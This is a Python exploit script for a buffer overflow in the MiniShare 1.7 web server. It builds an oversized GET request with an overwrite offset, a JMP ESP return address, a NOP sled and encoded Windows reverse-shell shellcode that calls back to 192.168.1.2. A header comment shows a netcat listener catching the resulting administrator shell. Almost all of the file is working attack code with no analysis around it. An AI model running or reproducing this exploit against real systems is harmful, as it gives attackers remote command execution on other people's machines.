#!/usr/bin/python
#
# root@bt:~# nc -vlnp 4444
# listening on [any] 4444 ...
# connect to [192.168.1.2] from (UNKNOWN) [192.168.1.4] 1074
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\Documents and Settings\Administrator\Desktop\minishare\minishare-1-7>
#

import socket, sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((sys.argv[1], 80))

buffer = "GET "

# 1787 bytes until EIP gets overwritten
buffer += "A"*1787

# JMP ESP in user32.dll
buffer += "\x13\x53\x45\x7e"

# NOPSLED
buffer += "\x90"*16

# msfpayload windows/shell_reverse_tcp LHOST=192.168.1.2 R | msfencode -a x86 -b "\x00\x0d" -t c
buffer += ("\xda\xd7\xd9\x74\x24\xf4\xba\xf3\x83\x17\xf8\x5f\x31\xc9\xb1"
"\x4f\x31\x57\x19\x83\xef\xfc\x03\x57\x15\x11\x76\xeb\x10\x5c"
"\x79\x14\xe1\x3e\xf3\xf1\xd0\x6c\x67\x71\x40\xa0\xe3\xd7\x69"
"\x4b\xa1\xc3\xfa\x39\x6e\xe3\x4b\xf7\x48\xca\x4c\x36\x55\x80"
"\x8f\x59\x29\xdb\xc3\xb9\x10\x14\x16\xb8\x55\x49\xd9\xe8\x0e"
"\x05\x48\x1c\x3a\x5b\x51\x1d\xec\xd7\xe9\x65\x89\x28\x9d\xdf"
"\x90\x78\x0e\x54\xda\x60\x24\x32\xfb\x91\xe9\x21\xc7\xd8\x86"
"\x91\xb3\xda\x4e\xe8\x3c\xed\xae\xa6\x02\xc1\x22\xb7\x43\xe6"
"\xdc\xc2\xbf\x14\x60\xd4\x7b\x66\xbe\x51\x9e\xc0\x35\xc1\x7a"
"\xf0\x9a\x97\x09\xfe\x57\xdc\x56\xe3\x66\x31\xed\x1f\xe2\xb4"
"\x22\x96\xb0\x92\xe6\xf2\x63\xbb\xbf\x5e\xc5\xc4\xa0\x07\xba"
"\x60\xaa\xaa\xaf\x12\xf1\xa2\x1c\x28\x0a\x33\x0b\x3b\x79\x01"
"\x94\x97\x15\x29\x5d\x31\xe1\x4e\x74\x85\x7d\xb1\x77\xf5\x54"
"\x76\x23\xa5\xce\x5f\x4c\x2e\x0f\x5f\x99\xe0\x5f\xcf\x72\x40"
"\x30\xaf\x22\x28\x5a\x20\x1c\x48\x65\xea\x2b\x4f\xf2\xd5\x84"
"\x4e\x01\xbe\xd6\x50\x14\x62\x5e\xb6\x7c\x8a\x36\x61\xe9\x33"
"\x13\xf9\x88\xbc\x89\x69\x28\x2e\x56\x69\x27\x53\xc1\x3e\x60"
"\xa5\x18\xaa\x9c\x9c\xb2\xc8\x5c\x78\xfc\x48\xbb\xb9\x03\x51"
"\x4e\x85\x27\x41\x96\x06\x6c\x35\x46\x51\x3a\xe3\x20\x0b\x8c"
"\x5d\xfb\xe0\x46\x09\x7a\xcb\x58\x4f\x83\x06\x2f\xaf\x32\xff"
"\x76\xd0\xfb\x97\x7e\xa9\xe1\x07\x80\x60\xa2\x38\xcb\x28\x83"
"\xd0\x92\xb9\x91\xbc\x24\x14\xd5\xb8\xa6\x9c\xa6\x3e\xb6\xd5"
"\xa3\x7b\x70\x06\xde\x14\x15\x28\x4d\x14\x3c")

buffer += " HTTP/1.1\r\n\r\n"

sock.send(buffer)
print '[*] --> Payload sent successfully'
print '[*] --> w00t!w00t!'
sock.close()
